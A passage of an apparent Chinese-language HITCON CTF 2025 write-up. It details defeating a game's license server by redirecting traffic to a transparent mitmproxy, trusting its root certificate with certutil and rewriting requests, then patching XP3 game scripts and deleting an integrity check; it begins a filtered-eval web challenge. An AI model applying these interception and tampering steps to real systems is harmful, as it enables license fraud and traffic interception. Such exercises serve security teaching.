width="29.287ex" height="2.565ex" role="img" focusable="false" viewBox="0 -883.9 12945 1133.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="msup" transform="translate(905.6,0)"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(484,413) scale(0.707)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g></g><g data-mml-node="mo" transform="translate(2015.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(3015.6,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="msup" transform="translate(3921.1,0)"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(484,413) scale(0.707)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g><g data-mml-node="mo" transform="translate(4975.3,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(6369.5,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(7369.8,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g></g><g data-mml-node="mspace" transform="translate(8275.3,0)"></g><g data-mml-node="mo" transform="translate(9275.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(9664.3,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mspace" transform="translate(11553.3,0)"></g><g data-mml-node="mi" transform="translate(12053,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(12556,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>（By <a class="link" target="_blank" rel="noopener" href="https://asia-hokak.github.io/">Dr. dog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)</p>
+<p>只要解出 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.02ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 451 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container> 就是 license 了，而且解 license 所需的都可以取得（從 server database 中可拿到 ActivationTag，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="1.061ex" height="1.023ex" role="img" focusable="false" viewBox="0 -442 469 452"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g></g></svg></mjx-container> 可以從自己的電腦上 或是用 MitM 取得）。</p>
+<p>解出 license 會發現，包含不可視字元，根本填不進 license 輸入框。這時就只能想辦法把 license 塞進去了，一種解法可以用 <a class="link" target="_blank" rel="noopener" href="https://github.com/mitmproxy/mitmproxy">mitmproxy<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 把送出去的 license 改成有不可視字元的版本，注意題目使用合法 https 憑證，所以需要先把系統信任 mitmproxy 產生的憑證；另一種解法是透過逆向 + 動態把 license 值改了就行了。</p>
+<p>這邊介紹 mitmproxy 的解法：<br>先在機器上游的 router 安裝好 <a class="link" target="_blank" rel="noopener" href="https://docs.mitmproxy.org/stable/overview/installation/">mitmproxy<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，這邊使用的 上游 router 是 Debian 的機器。接著我們要把到 port 9114 的流量（license server port），轉到 8080 來聽；這裡編輯 <code>/etc/nftables.conf</code>，在裡面加入對應規則：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">table ip nat {</span><br><span class="line">        chain prerouting {</span><br><span class="line">                type nat hook prerouting priority dstnat; policy accept;</span><br><span class="line">                iif "ens19" tcp dport 9114 redirect to :8080</span><br><span class="line">        }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p>接著把 nftables 打開、開啟 mitmproxy 即可開始 mitm</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart nftables</span><br><span class="line">mitmproxy --mode transparent</span><br></pre></td></tr></table></figure></div>
+
+<p>這時候輸入 license 會發現，因為不是合法 https 的憑證會出錯，所以這邊還需要讓系統信任 mitmproxy 的憑證</p>
+<p><img src="/hitcon-ctf-2025/mitm-error.webp" alt="mitm-error"></p>
+<p>可以參考<a class="link" target="_blank" rel="noopener" href="https://docs.mitmproxy.org/stable/concepts/certificates/">這邊<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>的做法來讓機器信任憑證</p>
+<p>基本上就是把 router 上的 <code>~/.mitmproxy/mitmproxy-ca-cert.cer</code> 放到跑遊戲的機器上，然後執行</p>
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -addstore root mitmproxy-ca-cert.cer</span><br></pre></td></tr></table></figure></div>
+
+<p>接著就可以用以下指令 mitm 了</p>
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmproxy --mode transparent</span><br></pre></td></tr></table></figure></div>
+
+<p>如果需要竄改 request，可以參考<a class="link" target="_blank" rel="noopener" href="https://docs.mitmproxy.org/stable/addons/examples/">如何寫 mitmproxy addon<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，下面提供了一個更改 computer info 及 license 的範例：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http-modify-query-string.py</span></span><br><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> http</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">flow: http.HTTPFlow</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> flow.request.path == <span class="string">'/api/verify'</span>:</span><br><span class="line">        flow.request.urlencoded_form[<span class="string">'license'</span>] = <span class="string">"61616161626262626363636364646464"</span></span><br><span class="line">        flow.request.urlencoded_form[<span class="string">'computerInfo'</span>] = <span class="string">"{f211c6a8-c712-11ef-a817-806e6f6e6963}"</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmproxy --mode transparent -s http-modify-query-string.py</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>這樣就能正常 activate license 了。mitmproxy 也可以接到 BurpSuite 上，就連修改封包也變的更直接了，指令大概如下，不過機器會需要信任 BurpSuite 的憑證。</p>
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmproxy --mode upstream:http://127.0.0.1:8080  --listen-port 8081 --ssl-insecure</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>這邊還有另一種解法，由於 server 的 source code 都 leak 出來了，我們可以得知 <code>/api/verify</code> 的 response 的 key 是多少，這樣就改 response 就可以 activate license 了。（這個解其實是因為 不小心把 Dockerfile 也包進去，導致 key 洩漏的；所以算稍微 unintended）</p>
+<p>License 驗證好後，會發現 data.xp3 變大了；表示成功取得完整版的遊戲。可以開始逆向遊戲本體。</p>
+<p>在比賽中看到一堆人直接開始逆向 game.exe，但那是開源遊戲引擎，裡面根本沒有我們寫的 code。從工作管理員裡面也可以得知，那是 KIRIKIRI 遊戲引擎。要逆向應該是要逆向 <a class="link" target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-tw/%E5%90%89%E9%87%8C%E5%90%89%E9%87%8C#TJS">TJS<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。而 TJS 很可能會被包在 XP3 裡面。(By <a class="link" target="_blank" rel="noopener" href="https://github.com/whiteskull20">WSL<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)</p>
+<blockquote>
+<p>XP3 的結構可以參考 <a class="link" target="_blank" rel="noopener" href="https://galgamer.moe/article/20021">Uncover XP3 前篇：認識基本 XP3 封包格式<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>（這次出題學到了很多 gal game 的知識</p>
+</blockquote>
+<p>可以用 <a class="link" target="_blank" rel="noopener" href="https://github.com/storycraft/xp3-tool/">https://github.com/storycraft/xp3-tool/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 把 data.xp3 解包，解包可以找到 scenario/scene1.ks 中處理 flag 的地方：</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cnt = f.<span class="property">endings</span>.<span class="title function_">push</span>(tf.<span class="property">ending</span>);</span><br><span class="line"><span class="keyword">var</span> i;</span><br><span class="line"><span class="title class_">Debug</span>.<span class="title function_">message</span>(cnt);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; cnt;i++) <span class="title class_">Debug</span>.<span class="title function_">message</span>(f.<span class="property">endings</span>[i]);</span><br><span class="line">tf.<span class="property">pass</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (cnt == <span class="number">16</span>)</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">var</span> ends = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">    ends.<span class="title function_">load</span>(<span class="string">"endings"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; cnt;i++) <span class="title class_">Debug</span>.<span class="title function_">message</span>(ends[i]);</span><br><span class="line">    tf.<span class="property">pass</span> = <span class="number">1</span>;</span><br><span class="line">    tf.<span class="property">keystr</span> = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">var</span> dic = %[<span class="number">0</span> =&gt; <span class="string">"0"</span>, <span class="number">1</span> =&gt; <span class="string">"1"</span>, <span class="number">2</span> =&gt; <span class="string">"2"</span>, <span class="number">3</span> =&gt; <span class="string">"3"</span>, <span class="number">4</span> =&gt; <span class="string">"4"</span>, <span class="number">5</span> =&gt; <span class="string">"5"</span>, <span class="number">6</span> =&gt; <span class="string">"6"</span>, <span class="number">7</span> =&gt; <span class="string">"7"</span>, <span class="number">8</span> =&gt; <span class="string">"8"</span>, <span class="number">9</span> =&gt; <span class="string">"9"</span>, <span class="number">10</span> =&gt; <span class="string">"A"</span>];</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; cnt;i++){</span><br><span class="line">        <span class="keyword">if</span> (f.<span class="property">endings</span>[i] != ends[i]){</span><br><span class="line">            tf.<span class="property">pass</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        tf.<span class="property">keystr</span> = tf.<span class="property">keystr</span> + dic[f.<span class="property">endings</span>[i]];</span><br><span class="line">    }</span><br><span class="line">    f.<span class="property">endings</span> = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>以及</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Plugins</span>.<span class="title function_">link</span>(<span class="string">"clientDLL.dll"</span>);</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line">a.<span class="title class_">DecryptData</span>(<span class="string">"flag"</span>, <span class="string">"credits.mov"</span>, tf.<span class="property">keystr</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><code>f.endings</code>會記錄玩家依序觸發的結局 ID，並轉換成 16 進位字串與 endings 比較。所以只要稍微修改一下 code 再用 xp3 packer 包成data.xp3 就好，例如改成：</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i;</span><br><span class="line"><span class="keyword">var</span> ends = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">ends.<span class="title function_">load</span>(<span class="string">"endings"</span>);</span><br><span class="line"><span class="keyword">var</span> keystr = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">var</span> dic = %[<span class="number">0</span> =&gt; <span class="string">"0"</span>, <span class="number">1</span> =&gt; <span class="string">"1"</span>, <span class="number">2</span> =&gt; <span class="string">"2"</span>, <span class="number">3</span> =&gt; <span class="string">"3"</span>, <span class="number">4</span> =&gt; <span class="string">"4"</span>, <span class="number">5</span> =&gt; <span class="string">"5"</span>, <span class="number">6</span> =&gt; <span class="string">"6"</span>, <span class="number">7</span> =&gt; <span class="string">"7"</span>, <span class="number">8</span> =&gt; <span class="string">"8"</span>, <span class="number">9</span> =&gt; <span class="string">"9"</span>, <span class="number">10</span> =&gt; <span class="string">"A"</span>];</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">16</span>;i++){</span><br><span class="line">    keystr = keystr + dic[ends[i]];</span><br><span class="line">}</span><br><span class="line"><span class="title class_">Plugins</span>.<span class="title function_">link</span>(<span class="string">"clientDLL.dll"</span>);</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line">a.<span class="title class_">DecryptData</span>(<span class="string">"flag"</span>, <span class="string">"credits.mov"</span>, keystr);</span><br></pre></td></tr></table></figure></div>
+
+<p>執行後可能會發現遊戲顯示錯誤，透過簡單的逆向或是上網查資料可以發現這是由於 plugin/start.tpm（tpm是改了附檔名的DLL，可以使KRKR 優先載入，通常會用來解密有加密過後的 XP3）中做了檔案校驗，可以發現除了改 CWD（為了與 electron 相容）以外裡面沒有其他有意義的程式，可以直接刪掉。刪完之後直接執行 game.exe 就可以看到 FLAG 了。</p>
+<h3 id="Jeopardy"><a href="#Jeopardy" class="headerlink" title="Jeopardy"></a>Jeopardy</h3><h4 id="web-Useless-Template-Renderer"><a href="#web-Useless-Template-Renderer" class="headerlink" title="[web] Useless Template Renderer"></a>[web] Useless Template Renderer</h4><p>Caleb 出的，題目看起來很眼熟；因為這是 SECCON CTF 的題目，而且那題就是跟 Caleb 一起解的。</p>
+<p>題目給了一個 prototype pollution 以及任意執行沒有 match 到 <code>[a-zA-Z!@#$={};:'"</code>~,?\_]` 的 code。</p>
+<p>基本上就是 JSFuck 的更少符號版（或是更多，因為可以用 Unicode）。</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>({ <span class="attr">extended</span>: <span class="literal">true</span> }))</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">renderTemplate</span>(<span class="params">template, context = {}</span>) {</span><br><span class="line">    <span class="keyword">return</span> template.<span class="title function_">replace</span>(<span class="regexp">/{{(.*?)}}/g</span>, <span class="function">(<span class="params">_, code</span>) =&gt;</span> {</span><br><span class="line">        code = code.<span class="title function_">trim</span>()</span><br><span class="line">        <span class="keyword">if</span> (code.<span class="title function_">match</span>(<span class="regexp">/[a-zA-Z!@#$={};:'"`~,?\\_]/g</span>)) {</span><br><span class="line">            <span class="keyword">return</span> context[code] ?? <span class="string">"???"</span></span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">try</span> {</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">eval</span>(code);</span><br><span class="line">            } <span class="keyword">catch</span> (e) {</span><br><span class="line">                <span class="variable 